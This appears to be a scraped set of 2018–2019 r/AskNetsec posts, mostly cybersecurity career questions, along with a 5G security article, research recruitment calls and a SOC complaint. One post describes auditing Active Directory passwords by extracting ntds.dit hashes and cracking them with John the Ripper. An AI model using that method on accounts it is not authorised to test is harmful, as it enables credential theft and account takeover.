879,cybersecurity,AskNetsec,5G and the Future of Cybersecurity,0,b9dpni,https://www.reddit.com/r/AskNetsec/comments/b9dpni/5g_and_the_future_of_cybersecurity/,2019-04-05 01:53:22," Just as 4G networks led to the ubiquity of the smartphone and other smart devices, 5G networks will lead to the rise of billions of new devices connected to the Internet, all talking with one another at incredibly fast speeds with remarkably low latency. This will open up vast new possibilities for consumers, businesses and society as a whole  everything from self-driving cars on the road to the ability for doctors to conduct remote surgery from anyplace in the world. **Verizon 5G keynote at CES** At the 2019 CES in Las Vegas, for example, Verizon CEO Hans Vestberg laid out a compelling vision for 5G, noting that it would help to bring about the Fourth Industrial Revolution. There are many technologies today powering this Fourth Industrial Revolution  everything from artificial intelligence and robotics to the Internet of Things (IoT) and virtual reality  and all of them are being given a push forward by 5G. AI, for example, is making it possible to create self-driving cars, while the IoT is making it possible for smart devices to become ubiquitous, both in the home and within the enterprise. To highlight the various ways that Verizon is already starting to make this 5G future a reality, Vestberg invited a number of key technology partners on stage with himself, including top executives from the New York Times, Walt Disney Studios, and drone company Skyward to showcase some of their best 5G projects. The New York Times, for example, is the middle of creating a new 5G journalism lab to support data-intensive technologies such as VR and AR, while Skyward is making it possible to control as many as one million drones from anywhere in the world. (And, indeed, during his CES keynote, Vestberg piloted a drone based in Los Angeles while on stage in Las Vegas) **Cybersecurity concerns in the 5G world** And, yet, this exciting new 5G world will encounter its own share of cybersecurity challenges. Hackers and cybercriminals in the world will still look for ways to access user data and profit from it. With billions of devices connected to the Internet, they will have an incredibly large attack surface in which it will be much easier to find the proverbial weakest link in the security chain. Geoffrey R. Morgan, Founding Partner at Fairchild Morgan Law, suggests that, The exponential increase in speed, density and efficiency afforded by 5G technology will cause a dramatic rise in cybersecurity concerns, particularly by those industries that are among the first to utilize it. Moreover, the ability of hackers to cause harm and destruction will also mount exponentially. In todays 4G world, a huge botnet formed by hacking into user devices in the home could be used to mount large-scale DDOS attacks on websites; in tomorrows 5G world, that same botnet could be used to take out an entire network of self-driving cars in a single city, leading to mayhem on the roads. Obviously, then, cybersecurity is just as much a concern in the 5G world as it is in the 4G world  and perhaps more so. Vast amounts of remote sensors and smart devices hooked up to global supply chains, for example, will radically increase the complexity of securing corporate networks from intruders and cyber criminals. And the sheer amount of data being created by 5G networks will make it much more difficult to spot anomalies in user behavior resulting from hackers. According to one estimate, for example, the data output of a single autonomous vehicle in one day will equal the daily output of 3,000 people. **The 8 currencies of 5G** The good news is that 5G is still so new that there is time to make security a priority. That, says Verizon CEO Hans Vestberg, is one reason why the company has come up with the idea of 8 currencies for 5G. These currencies  peak data rate, mobile data volume, mobility, connected devices, energy efficiency, service deployment, reliability and latency  all represent key features of the Verizon 5G network that make it completely unlike anything weve seen before. For example, peak data rate refers to the ability to generate speeds of up to 10 Gbps, while mobility refers to the ability to stay connected while moving at speeds of up to 500 km/hour. In the 3G and 4G world, the way that companies thought about their networks was in terms of two simple currencies: speed and throughput. In other words, how fast can you make uploads and downloads, and how much volume can your network handle at any point in time? But in a 5G world, companies need to expand their thinking from two currencies to eight currencies. Doctors and healthcare professionals, for example, place a tremendous value on latency: when they are doing remote surgeries, it is absolutely critical that end-to-end latency is as close to zero as possible. And, given the challenges posed by climate change, enterprises are much more aware of the value of the energy efficiency currency when it comes to 5G networks. Using the 8 currencies of 5G to power future cybersecurity innovations By taking this big picture view, it is possible to consider how the 8 currencies of 5G will have a positive impact on how we address cybersecurity issues in the future. Since 5G is not simply a faster version of 4G, but rather, an entirely new network architecture, it opens the door to entirely new security models for user privacy, identity management, and threat detection. For example, Hed Kovetz, CEO &amp; Co-founder at Silverfort, notes that, The 5G system incorporates secure identity management for identifying and authenticating users to ensure that only the genuine user can access services. Its new authentication framework enables mobile operators to choose authentication credentials, identifier formats and authentication methods for users and IoT devices. Moreover, the mobility currency, or the ability to stay connected while traveling at very fast speeds, means that it might be possible to create virtual security environments that travel with us as we move from point to point, regardless of which device we use, through the use of virtualization and cloud technologies. In fact, Robert Arandjelovic, Director of Product Marketing (Americas) at Symantec, suggests that, A transition to 5G could lead to the complete obsolescence of the network perimeter. With the growth in cloud services and applications, the erosion of that perimeter has already begun In a hyper-connected, non-perimeter world, the cloud and the endpoint become the new place where security technologies can be deployed to keep people safe. The mobile data volume currency means that emerging technologies that rely on vast amounts of data  such as machine learning and artificial intelligence  can now be deployed to create new AI-powered cybersecurity solutions. One idea that is gaining traction, for example, is using AI to spot anomalies in user and system behavior. This acts as a form of automated threat detection and mitigation, and helps to reduce the current dependence of 4G networks on user names and passwords as a way to keep users safe. In many ways, AI cybersecurity solutions would benefit greatly from 5G. Aaron Bugal, Global Solutions Engineer at Sophos, notes that, 5G connectivity could help the way in which information integral to making a security decision is transported to the automated processes and people who need it. An example of this would be the ongoing benefit to artificial intelligence platforms that will only work best when they have as much information as possible to digest and learn from. Especially when theyre tasked with identifying unusual behavior across an organization, most of these platforms feed off data local to them, with devices that are remote or mobile unable to properly feed (upload) to these systems and typically exposing a short fall in awareness. 5G could unlock more data to get to an AI security platform in a shorter time and allow for best understanding of the organization and faster and accurate prediction of a security event. **Cybersecurity and Verizons Built on 5G challenge** To help innovators come up with new 5G cybersecurity solutions, Verizon has launched a Built on 5G Challenge that offers a $1 million prize for a truly unique idea that builds on top of the 8 currencies of 5G. The Built on 5G Challenge will begin accepting submissions in April, with the winning team announced during Mobile World Congress Americas in October. For security researchers around the world, this could become a unique opportunity to make cybersecurity an enabling technology, rather than simply a tax on innovation. If the New York Times and Walt Disney Studios are creating their own showcase 5G labs, why cant cybersecurity researchers also create their own 5G labs and launch innovative new products that use 5G? Clearly, there is enormous potential for 5G to change how we address cybersecurity issues in the future. Many of the best technologies today  especially artificial intelligence  can be fully leveraged on these super-fast, low-latency 5G networks. As Verizon CEO Hans Vestberg noted at CES, 5G will change everything. And that, of course, includes cybersecurity.

884,cybersecurity,AskNetsec,Which skill should I focus on in cybersecurity - defensive vs offensive?,2,ba7tzj,https://www.reddit.com/r/AskNetsec/comments/ba7tzj/which_skill_should_i_focus_on_in_cybersecurity/,2019-04-07 05:14:52,"I am a computer science student with some experience in development. I wanted to dive into cybersecurity, so I took two courses: 1) Started with web penetration testing using Kali on Udemy. It was a fun course, I was exploiting Metasploitable in different ways. However, I couldn't help but noticing that at the end of the day it was just using tools and learning commands. My knowledge of development helped me here, but the exercise looked less conceptual and more learning steps to achieve something. 2) Then I took a coursera course by NYU (which looked more professional tbh). According to the professor, penetration testing is not the answer to the cybersecurity problems and one should focus on the defensive part of it. However the course was too theoretical and easy. I quickly realised that reading a book would be better and I needed a more hands-on approach to keep me going. However, I was quite convinced by lecturer's opinion about penetration testing - how more robust solutions are necessary. I see two paths in front of me. 1) Learn IDS, snort rules, firewall configuration, cloud security concepts, malware analysis and access control management. I found great courses which are hands-on and teach you administration and network design on Amazon on Coursera. This is what I mean by 'defensive' side of security 2) Enhance my penetration testing skills by trying out CTFs and enhancing my hacking skills by practicing day in day out, i.e, the offensive side. Many people have given me different opinions about this. Some believe first is more useful but some believe penetration testing is essential to get any job. I wanted to know from security professionals working which kind of skill is more beneficial for my job profile. I know both are important and have their place in the industry, but is their a preference that companies attach to any of them, especially a fresher like me? My end goal is find a job in this industry. Long term plan is become a security solutions architect (if that's relevant). I am from India, by the way. If anybody's familiar with that market, do share your opinions. Thank you for your time. "

What Now?,1,ahts2b,https://www.reddit.com/r/AskNetsec/comments/ahts2b/am_i_hacked_how_what_now/,2019-01-20 14:33:11,"Not sure if this is an appropriate place to post but here goes: I was browsing around yesterday, strangely enough on a website about hacking, when I started noticing some unusual behavior from my computer. First of all, there was an error when I tried opening a .jpg saved on my drive, something about not finding it in the server or something. There were also several audible beeps made by my computer at different times, that I have never heard before. I also remember clicking on a link that first took me to google chromes oops web page, the one it takes u if it cannot find a connection, but then quickly reloaded to where it was supposed to go and nothing was amiss. The website was null-byte.wonderhowto.com which claims to be a blog of sorts for white hat hackers in training. It seems pretty legit but I mean it is run by a hacker no doubt. I did not download anything specifically from the site but did however download a Kali Linux ISO file that I never installed in addition to oracles virtualBox VM which I did install, whose sites I both reached from articles found on the website in question. My question is this. Is anyone familiar with this site and is it trustworthy? Ive tried googling for more info about the site but I cant find any dirt on it. I also double checked the two downloads reliability which seemed fine. I personally believe I was hacked because I have never experienced anything quite like that on my computer before, and what a coincidence it all happens while browsing and downloading hacker resources. I immediately disconnected from my WiFi, reset my modem/router, booted my computer in safe mode, and waited a day trying to decide what to do. Ive scanned with web root which I have a liscence for and used rkill from beepingcomputer and both have reported no issues or found threats. Im interested to hear from a professional or anyone with more experience because Im uncertain whether or not Im hacked or even how, or if I am just noticing all these little things because my mind is focused on cybersecurity. Any input is appreciated."

What's the best and worst things I can do to get there? **The longer version:** Hey there so I'm 30 years old and have been working in internet marketing (mostly SEO) for 10+ years. Most of my adult life. I'm looking for a career change. Back when I was 19 I joined the USAF to do cyber security but ended up getting hurt in training due to a previous existing, non-curable health condition so I was sent home (without any benefits). Now I'm re-considering that path. I'm not too late, am I? I went to college for a while and got a BAS in Video Game Design. The degree itself is probably unrelated but I bring it up because I _do_ have a full college experience and a degree. I'd _really_ rather not have to go that route, again, but I will if I have to. Otherwise, I've purchased many books over the years on various aspects of cyber security, mostly from Humble Bundles but some impulse buys, too (like Michael Bazzell's OSINT books). I have a decent day job now so I'm covered during the learning phase but eventually I'd like to get a job. What's the path I should take? Do I need certs? Do I just learn from books and practice on CTF's? How do I know when I'm really to apply for a job? What's that process going to look like? Thanks in advance."

Im taking my Masters online and ive been presented with a little dilemma. I need to choose whether to upgrade my current PC at home or get a laptop for studies and future work. I have a gaming rig with decent specs, however seeing as how my first course already required VM's, i was considering upgrading to a pcie ssd and up to 32gb of ram plus a new monitor for a 3 monitor setup which helps out with referencing reading material and general workflow. However, i also know that i will be needing to take a laptop when doing my residency and for IT work a laptop is good to have. A caveat to this is I have access to an old laptop i recently put an ssd in however does not have much in regards to cpu or ram. Any suggestions? Have no idea if i should get a laptop with decent specs and upgrade the desktop later or vice versa. This would be geared towards security research and general cybersecurity studies. For gaming i can still count on ol' trusty at home with or without the upgrade. Thanks! URL"

Background: I am a non-US citizen, currently in the US on a student visa (completing my MS in cybersecurity, graduating in May 2019). I have been in the US for 5 years (did my CS bachelors here as well). I currently work in a SOC for a multinational, as a dev of sorts (writing tools and other bits of security automation) whilst I finish my masters. I will have a year's experience in this job by the time I graduate. I am constantly doing labs (HTB), CTF, etc to keep my skills sharp (also to learn stuff like infra/AD pentesting), and I plan to get into bug bounty before I graduate in May to get some real-world web app experience. I have the OSCP and OSCE. Several recruiters have let me know that my lack of US citizenship will make it very difficult to find a pentesting/red team job in the US. I know that this is largely due to a lack of offensive security roles with companies that sponsor non-US citizens, but also due to my inability to get any sort of clearance. Have any of you heard of non-US citizens working in the US in real offensive security roles, where the primary duties are conducting pentests/red team engagements? Are any of you in that role as non-citizens? If so, how did you go about securing it? Any tips? Trying to see if it is worth sticking around here or if I should leave the US to pursue my passion. Really not down to suffice with a software dev/SOC job just to say in the US, also because I know I will have to stick such a job out for many years as my immigration status will be tied to the job.

In development or other tasks that result in something being added in the product, you can ~~lie with~~ use statistics to assign a value of the task (+revenue, -cost savings, +boss happiness, whatever). You can then use that ""value"" versus your (almost never correct) estimate of how much resources it takes to complete that task to prioritize what to do first. Is there something similar for NetSec or cybersecurity? The CIS Critical Security Controls and others list out a whole bunch of shiny things you can do, but let's say (as usual) you can't implement everything at once. Is there a way to say with numbers / lie with statistics how important that control would be to implement? Some of them are easy: If you have a wide open Remote Desktop to your database, then you can say that server can get !@#$ in less than 5 minutes with 99+% probability. (If I recall Symantec's study was that the autosploit will get you within 2 minutes.) Therefore, closing up the wide open server can pretty much be assigned the same value as the database server, its contents, people who can't work without the database, etc. Training against phishing / dumb passwords are easy enough to assign value as well, since the last State of Cybersecurity Report and others show something like 60% or more of breaches are dumb passwords or phishing. Therefore the good old calculation of cost of the boss or admin's account getting !@#$'d multiplied by the highest number you ""extrapolate"" from studies can work out to some value. What about more subtle things, like applying ""medium"" priority security updates to the libraries that make up an internal (as in you need to be at work or connected with VPN ...or secret shell... to even see it) application? It's a lot harder to get any numbers to say how likely attackers are going to !@#$ your internal app. \--- So after you think you've dealt with the massive security holes that could crater your operation in less than a month, how do you set priority for the other security tasks / implementation of countermeasures? &amp;#x200B;"

I enjoy doing IT stuff as a hobby since I was a child. Approximately 6 years ago, I started programming, mostly participating in gaming projects and open-source softwares. I started to dream of a cybersecurity career 2 years ago, as I enjoyed playing hacking games and participating in CTFs and hacking conferences here in Paris. I **finally** graduated from high school in August 2018, and was accepted in a networking school that required me to find an apprenticeship to complete the year. The problem was, being born in December, and being way too young compared to other candidates, I never really stood a chance even though I had 8 job interviews for various IT positions, in small and big companies. The only professional experience I can show is a 1 year student part time job as a python and web developer, done while graduating from high school. This Friday, I will be forced to end my scholarship because I didnt find an apprenticeship. So yeah, here I am now, kind of lost, I dont know what I should do. Here are my options: 1. Trying desperately to find a late scholarship again, starting in January. ( You know, the kind of application to universities made by people who were not content of their choice, after the first semester ) 2. Working with my dad as a hardwood floor installer 3. Studying home for certifications for the next 6 months, and try to get my resume to the point it doesnt say Im a 17 years old rookie looking to be a burden for you. 4. Look for a Help Desk job, in order to have a minimum of professional experience. I think I should go with 3. I want to study my \*\*\* off in order to have certifications. By I want I mean I am super motivated. But is it enough?.. Should I go for another option, try studying another simpler certification, or go for certificates such as OSCP, even though it is hard ? I dont want to take bad decisions anymore. Thank you in advance for your advices, PS: Oh and I have CCNA R&amp;S, taken in last November because my school was a Cisco Instructor school as well"

While I do understand the speculation about a cybersecurity degree just being hyped, the degree plan at other universities are filled with certs, which sounds lovely to add to my arsenal of letters. While on the other hand, Computer Science exemplifies a well-rounded individual to the field as a whole, but the courses just don't look as exciting to me. Should I stay where I'm at with the IT degree? Does it look meaningless to switch to the Cybersecurity degree? Is it worth slugging out the Computer Science degree and getting the certifications after?

Ive had an interest in computers since I was a kid, so a lot of concepts Ive come across researching cybersecurity werent completely foreign to me. I also go to a magnet school for IT, so Im alright at Java and Python (5 on AP exam for APCS). Definitely have the mindset that cybersecurity is the field I want to work in when Im older. Im considering going straight into the field instead of college (mainly to avoid student loans) and was wondering what you guys thought of that, as well as if I do go through with that an idea of a step in the right direction. The main thing Ive been looking at acquiring were a security clearance and certifications. Then just get some work experience to substitute for a degree. I went through Professor Messers Sec+ playlist and feel like I already know almost every topic mentioned in the course, so I could probably review a bit and just take the exam and pass it. The main cert I wanna get before im out of high school is the PWK/OSCP. PWK I plan on starting as soon as I get my first paycheck from the job im gonna start next week most likely. Any suggestions on other certs would be great, definitely looking at the CISSP as well. Main problem is that it requires 5 years of experience. Speaking of work experience, I would love to hear any suggestions on how to build that aspect of my resume. Im likely going to get a job as a help-desk technician, which I know isnt a huge deal, but at least its giving me some computer related experience to build off of. If you guys know any jobs that would allow a 17 year old to get a security clearance, that would be huge. Finally, I was wondering if anyone could give some estimates on what I could make if I went this route instead of college. Like 5 years down the line when I would hopefully have a good amount of certs and work experience (maybe TS clearance since thats one of my main goals), compared to if I was fresh out of college with no work experience and maybe a few certs. So to sum up all my questions: Would I be better off not going to college, and just straight into the field? And what salaries I would be looking at with each option? What would be a good certification path for me (given that I have a solid understanding of cybersecurity, but nothing too advanced)? Some websites and books recommendations would be great (Ive went through Cybrarys TCP/IP course, it was alright but still felt really basic). Any other general career suggestions would be greatly appreciated."

I am currently enrolling a class that practices for Comptia Network+ exam at school, and next year I probably will enroll a class that prepares for Server+ or Security+. Are Comptia certs worth it to be a pentester? I know that knowledge in networking is important to be a pentester. I am good with Java and planning to learn Python, Javascript, and more languages. I also have a very basic knowledge in Linux but will be practicing more soon. I also am in Cyber Patriots. So, basically I wish to be a penetration tester but I have no specific plan to achieve the goal because there are not many people to give me advice. What certs should I take in order?

Basically what happens is a fraudster phones up your mobile network provider and says you have lost your sim card or need a replacement, after convincing the staff there your phone number is then ported to the fraudsters device. From here, they can use the number to reset passwords for email addresses and the like in order to take over your online life, or perhaps to dig deeper and find out bank details before eventually targeting your money. I was wondering, this avenue of attack seems quite sophisticated to be attempted on the average joe, Im assuming these attacks are more common on rich people, perhaps involved in cryptocurrency or maybe who have a large media presence? It seems to me that there is nothing much in place to prevent this from happening? if there is please let me know. It actually seems like the security here is totally not in the victims hands but in fact in the hands of whatever service agent is dealing with the call. I know it is possible to perhaps set up over the phone passwords to protect an account further, but then again this would also really be up to the phone support to ask for it, and in some cases perhaps they dont.

As the entire ecosystem of the IoT evolves and expands, the wide range of functions and supporting components involved are resulting in significant security and ultimately privacy challenges that need to be addressed. The Industrial applications of IoT (IIoT) also referred as Industry 4.0 (Schwab, 2017) suffer from very similar security and privacy concerns as implementations that expand existing Operational Technologies (OT) networks through the interconnection of smart sensors and actuators with integrations into cloud computing platforms to create intelligent infrastructures create vital links within energy, transportation, manufacturing and automation. **The Research Purpose** The purpose of the proposed qualitative study is to explore, within the Biochemical industry, the experiences of cyber-security professionals who have experience in implementing Industrial Internet of Things systems and devices and their perceptions of the security risks to these systems, giving rise to a better understanding of the security and privacy concerns that must be overcome. **The research question:** *Within the Biochemical industry, what are the experiences of cyber-security professionals who have implemented Industrial Internet of Things systems and their perceptions of the security risks to these systems?* This exploration may lead to a better understanding of the security implications of a technology that is rapidly growing but is overlooked within SCADA due to a false sense of security. **Research study participation:** For data collection, this research study needs at least 10 participants for semi-structured interviews with an additional 2 for a pilot phase to fine tune the questions. The interviews will be conducted via Skype video conference calls in a nationwide scope. The primary focus of participants will be individuals who currently work within the chemical, biological, and pharmaceutical industries. Additionally, participants should be identifiable cybersecurity professionals. Each participant will answer about 10 interview questions. **Benefits of Participation** There may or may not be a direct benefit to participants in the study, but we hope to further the knowledge required to implement IoT Devices into industrial settings that will help organizations to improve their security posture that could indirectly benefit everyone.

So I decided I would write a program that works the same way. So I started with writing a program that connects to sites and requests html files through a GET message so then I would use them in my fake version of the website. What surprised me is when trying this little piece of program against thepiratebay.org I get a weird looking string. Also some time later after getting that string I installed a tcp/ip client on my phone and after connecting to thepiratebay.org and writing the http message manually I get a non ending row of messages that look like this: &lt;23.14 - 29.8.18&gt; server : null Then the tcp/ip Android app freezes. Is this some sort of a way on defending against crawling bots through buffer overflow crashes? I know how thepiratebay's reputation isn't so good. So could what I am assuming be true?

The positions that are low experience requirements (such as 3 minimum or 5 minimum) usually want pre-existing experience with tools. Enterprise level tools like vendor specific SIEMs, next gen firewalls, etc. Sadly, a lot of these things are not cheap. Not only that, but even if people buy them they may not have the capabilities to really use them. So all we can do is read about them, not really get any hands on experience. There are some courses and certification training things you can take, but again these are not uncommonly expensive. Especially when you're asking someone who is new to the industry to do it. Yes I've heard it before. Do another role first. I'm in pretty much a low level Sysadmin position/help desk position right now. I do a lot of work, but I don't see any chance of getting experience with these tools that I'm seeing a lot of cybersecurity positions requesting. Most job reqs I'm reading for things I'm ""qualified"" for don't indicate the chance to work with these. Trying to find an entry level network engineer position isn't much better either.

As the entire ecosystem of the IoT evolves and expands, the wide range of functions and supporting components involved are resulting in significant security and ultimately privacy challenges that need to be addressed. The Industrial applications of IoT (IIoT) also referred as Industry 4.0 (Schwab, 2017) suffer from very similar security and privacy concerns as implementations that expand existing Operational Technologies (OT) networks through the interconnection of smart sensors and actuators with integrations into cloud computing platforms to create intelligent infrastructures create vital links within energy, transportation, manufacturing and automation. The Research Purpose The purpose of the proposed qualitative study is to explore, the experiences of cyber-security professionals who have practical knowledge in implementing Industrial Internet of Things systems and devices and their perceptions of the security risks to these systems, giving rise to a better understanding of the security and privacy concerns that must be overcome. The research question: What are the experiences of cyber-security professionals who have implemented Industrial Internet of Things systems and their perceptions of the security risks to these systems? This exploration may lead to a better understanding of the security implications of a technology that is rapidly growing but is overlooked within Industrial Control Systems due to a false sense of security. Research study participation: For data collection, this research study needs at least 10 participants for semi-structured interviews with an additional 2 for a pilot phase to fine tune the questions. The interviews will be conducted via Skype video conference calls in a nationwide scope. The primary focus of participants will be individuals who currently work within the manufacturing industries. Additionally, participants should be identifiable cybersecurity professionals. Each participant will answer about 10 interview questions. Interviews will likely be no longer than one hour. Benefits of Participation There may or may not be a direct benefit to participants in the study, but we hope to further the knowledge required to implement IoT Devices into industrial settings that will help organizations to improve their security posture that could indirectly benefit everyone.

I've started the Masters degree programme, after a hiatus of +- 1 year, and I've half-finished the first year. The problem is: I'm tired of law, and have been for a few years now (hence the hiatus). I'm very interested in IT and I've followed several Infosec blogs over the years, and from what I've studied so far (a bit of Java programming, a bit of networking), I really like it. I'd like to delve deeper into netsec and other branches of infosec and I actually know what to study and where to study it, as the resources are plenty, but non of these online sources provide me with a degree or any type of certainty. I live in a West-European country where the emphasis on having a diploma is pretty strong to get a job (they always ask either a Bachelor or a Masters degree in CS/Applied CS). Certifications are an option, but they aren't all that well known where I live and are considered more of an extra than an actual foot in the door. There is no transitional programme from a bachelor of Laws to a master of Cybersecurity, as far as I know. I've looked everywhere, even abroad, but most programmes require a foundation in Computer Science and a degree to prove it. It's possible to get a job in the field as a DPO, but that would require me to finish the Master of Laws and hope to get a chance to get a more technical job, as they all lead towards GDPR compliancy jobs. While my knowledge of the GDPR is fairly OK, I really would like to get a more technical job (i.e. pentesting). I've held off posting a new topic for a while now, but I'm hitting rock bottom when it comes to law (grades are fairly low to average and motivation is down the drain), so I hope I can gain some insight from people here who've gone through the same process, or perhaps a similar situation. I know that in the US the emphasis on a diploma to get a foothold in a security position is not as strong, but in Western Europe (or at least where I live), it is. TLDR: I'm stuck studying law and suck at it, except for the parts that are interesting for Infosec and that interest me (GDPR). I can't get a job in this field (i.e. DPO) because I don't have my Masters. I want to switch to a technical netsec/infosec job without any concrete technical knowledge in a West-European country that demands degrees for every job. What do?"

I've always had this doubt but figured I'd get there once I get there. Penn State recently announced they're going to begin replacing my major with a new one (Cybersecurity Analytics and Operations) which tons of more technical course. This has raised my self-doubt to new heights and I'm feeling pretty dejected about it. I have no real career focus. Pentesting is what initially intrigued me but I haven't learned much in my studying that would prepare me for that. I've even thought of switching to computer science, but it'd take me an additional year to graduate. Am I overreacting and in my own head?

I have a few questions about monitoring john the ripper and a few questions about password ""strength"" in general. My boss wants me to audit our users' password strength. Our AD domain uses password complexity requirements and a minimum length of 9 characters. This has resulted in most users having terrible passwords like ""Mydogfluffy1"",etc,etc. We have a 2003 domain with 4 DCs. I followed (this guide)[URL I exported the hashes to john the ripper format. I used john with the rockyou wordlist and default ruleset to crack the LM hashes, then followed (these instructions)[URL to use the LM hashes to help crack the NT hashes. john cracked 1189 of 1663 LM hashes in a matter of minutes. Using the modified word/rule list against NT hashes, it found 420 passwords in a matter of hours. This was on a 2 core VM with 1GB of RAM and minimal virtual graphics. Here are my dumb questions: 1) How do I know when john is done cracking? Previously, I used john against the NT hashes without the LM support. This resulted in john running for days and days and me terminating it after two weeks' time. This time, it seemed to stop at some point with the LM hashes and then stop fairly quickly on the NT hashes. ~.john/john.pot shows a last write time of only a few hours after I started it. ps aux | grep john implies that the john process has ended for those hash files. 2) How accurate of a metric is this for how ""good"" users' passwords are? For instance, passwords like Dictionaryword45 are more common and thus ""worse"", but we did have a few ostensibly ""better"" passwords like Dictionaryword12notarealword8 get cracked. 3) The above audit technique--grabbing a copy of ntds.dit and extracting the hashes, then doing a hash comparison--is a worst-case scenario. We lock accounts out after 6 failed login attempts. As terrible as most of the recovered passwords are, only a few use our company name or major sports team names, and I'd honestly be surprised if any of these accounts could be compromised from the outside.

Just curious if anyone has a good explanation why the .eu/.uk domains are showing a big presence."
1034,cybersecurity,AskNetsec,"Is this a typical experience for an MSSP SOC analyst, or is my employer as awful as I think it is?",57,8c81a0,https://www.reddit.com/r/AskNetsec/comments/8c81a0/is_this_a_typical_experience_for_an_mssp_soc/,2018-04-15 00:55:48,"I primarily have a network/system admin background. This is my first job in a security specific role, so I don't have anything to compare it to. I'll be brief: - We provide cybersecurity to over 100 customers, but there's only 6 analysts. - Only 2 members of the team are US based. Those two US members do not work at the same time. - Foreign employees are not inherently a problem, but customers have complained that emails from our employees abroad read like spam mail. The language barrier also impedes our ability to communicate with each other and our customers. - Two of our analysts are just ticket pushers, but we still call them analysts. So really we only have 4 analysts. - There's not SOC tiers that we can escalate to. Just us 6, and there's only two working at any one time. And our boss, but he's unreliable. - Our SIEM only ingests information that's in a static format, by that I mean syslog and windows events. So no ipfix, pcap, nothing. Just the standard syslog and windows events. - Our SIEM only ingests logs from the devices that our customers set up to forward logs. I can never find a complete picture during an investigation, only like the picture frame. - 95% of our rules are based on threat intel. If there's suspicious traffic, we won't do anything about it because the 'IP is clean'. - We only use one source for our threat intel. If it shows up with no reputation there, we stop investigating. - Many of our correlation rules aren't really correlating anything. They take a single event and generate a case. I.e. a SonicWall generates an event with an Apache Struts exploit signature. We report that with no other supporting evidence. Many customers come back and say things like 'We don't use Apache, why are you sending us this?' - The other 5% use Windows events, and it's only for failed logins i.e. Windows Security Events 4624 &amp; 2645. There's no other implementation of our rules involving other Windows events, and in no other way than by measuring a certain number of failed logins in a specified period of time. - Our SIEM is abysmal at normalizing logs. It doesn't parse logs completely; it incorrectly parses; or it doesn't parse at all. Windows events essentially go unparsed. About half of the fields we parse out are different depending on what device is being parsed, so Device A might be parsed as like ""Character 7: DOMAIN/USER"", but Device B will be ""User: DOMAIN/USER"". - Speaking of parsing, we don't normalize logs for every device we ingest. But we tell customers we do. A handful of our customers have no device logs being normalized, so we never send them anything because nothing gets correlated. I asked my boss about it, and he said ""They don't pay enough money to justify creating a new parser for their device."" Actually there's a few things the sales pitch and demos involve that we straight up don't do. - Our incident handling guides for customers are all essentially the same regardless of the incident and basically say ""Block IP at the firewall, scan machine for malware"". - My boss: very nice guy and I like him, but I think he just watches 'Cybersecurity Webinars' all day. He doesn't assign projects, get involved with rule creation and event correlation, or do anything. The only emails he sends out are links to articles saying 'Hey team you should read this, it's good information."" - I recently sent an email to our SIEM support asking about something that should have been very easy to answer concerning regex and what syntax the SIEM recognizes when querying logs. This question had to go all the way to the company CTO to get an answer. The answer was ridiculous: our SIEM uses one syntax of regex but our log database uses another, so only use a syntax that both systems recognize. Lol. - Our support team frequently doesn't respond to emails or just lets an open case sit there, so issues with the SIEM go unfixed. - Our SIEM engine frequently gets backlogged or quits working because as stated earlier we have 100+ customers but only one engine set up to normalize and correlate events. There's no load balancing or high availability. If the correlation engine goes down, the logs just get lost in cyberspace or something. This is also related to regex: I've crashed the correlation engine because it couldn't handle a query I ran on the log database. - I've tried to promote change regarding our rules (especially shifting away from threat intel reliance) and how we correlate events, but it gets shot down. The reasoning: we don't want complicated rules, and we don't want too many rules. When I asked why, the answer was ""We are only equipped to do the basics."" - There's no professional development i.e. I don't get the opportunity to go to seminars or take courses. Those have to be self-funded on my own time. - There's more, but this gives a pretty good picture. Okay so I didn't keep it that brief. I'm sorry. I only plan to do a couple more months so I can put on my resume that I worked there for a year. edit: here's another good one: At the beginning of the year the company C-suite personnel had their big meeting for discussing how the company is moving forward. My boss was telling me about it and how they plan to double our customer base in 2018. I asked about the roadmap for internal growth i.e. hiring more analysts, more support, more resources, etc. He said we're fine as is and there's no plans."

Now moving a bit off topic: 7. With minimum explanation (I don't want to start a war), what do you think would be more useful thing to learn, ASP.NET Core or Node.js for back-end development? Just to mention I'm not looking for easy, I'm looking for something that could lead me to a job or part-time freelancing and they are both appealing. I am decent with C++ so the transition to C# won't hurt; oooor should I start leaning Javascript(which i don't mind)?

Obviously, the first part of this question will play a large role in if I decide to separate or not.

These topics are however still quite broad and vague and this is why I am asking you guys for tips and thoughts what things would be interesting to have a look at. I have briefly summed up some possible research topics that I have come up with and would be very glad with suggestions that might narrow these topics down! I read your topics daily and love you guys as a community, many thanks to all the help you give to everyone! * **Topics:** * Digitalization of Ports and its relation to risks and threats to security. * Awareness as a driver for a more cyber resilient environment in ports. * How regulation and guidelines can help steer ports toward a more cyber resilient environment. * Research into port systems evolution to drive a secure port * Threats of organized crime and how to go forward on this growing problem. (I think this is a really interesting topic, however im not sure whether this is researchable. (think of interviews with people involved etc.) * How can the port translate the 'technical' talk to be more understandable for business, i.e. make cybersecurity accessable for management and employees. * Implementing a (long term) cyber security strategy. (what would this look like and what are the implications) * Risk assessment of vulnerability across the various parts of the port, e.g. storage, boat-to-shore systems, oil. * Managing issues that come from the many different private owners in the port, and how to unite the port as one cybersecurity stronghold.

I don't know too much exactly what those do, but one appears to phone home to URL ... 2_oko.json which is a bit worrying with the combination of a ""ForceUpdate"" parameter shown and the lack of ssl, making it fairly likely that it's exploitable for remote code execution by anyone who can intercept your traffic(public wifi, etc). I'm planing on doing a system wipe when I get it, but hardware exploits seem to be unfixable. I'm not super hyped about the possibility of some dude in china being able to see everything on my laptop. I'm I being paranoid?"

If I leave the company, I owe them the last 365 days of tuition reimbursement, up to 10k. However, I'm finding that I don't quite enjoy the DoD Information Assurance field much at all. It feels too much like ""Paint by Numbers"" security, and the amount of governmental bureaucracy every project hinges on is just unbearable. I feel like it's killing my drive and hunger to actually do Info Sec. The cherry on top is that I'm also earning about 20% (15k) less than everyone else on my team due to my shorter resume (1 year experience), but I'm performing the same tasks (and in some cases far more effectively). I've done some vulnhub CTFs and light pentesting in my classes for my Masters, and feel like the OffSec field would be far more interesting and rewarding than continuing in Information Assurance. Honestly, I don't think I'd mind blue team near as much either if I were supporting Info Sec in a more progressive, forward-thinking industry/field. Do I spend my next 6 months finishing my Masters and work another year after that in a job/field I don't enjoy just to escape the reimbursement penalty? I can study/take OSCP in that time after my Masters. Or.. do I pause my Masters, study/pass the OSCP, and shorten my indentured servitude to the company to only 6 more months before I can find something more enjoyable? My Masters program can be held for 5 years without losing progress with my school. I'd appreciate any advice/insight you have to offer. Thank you!"

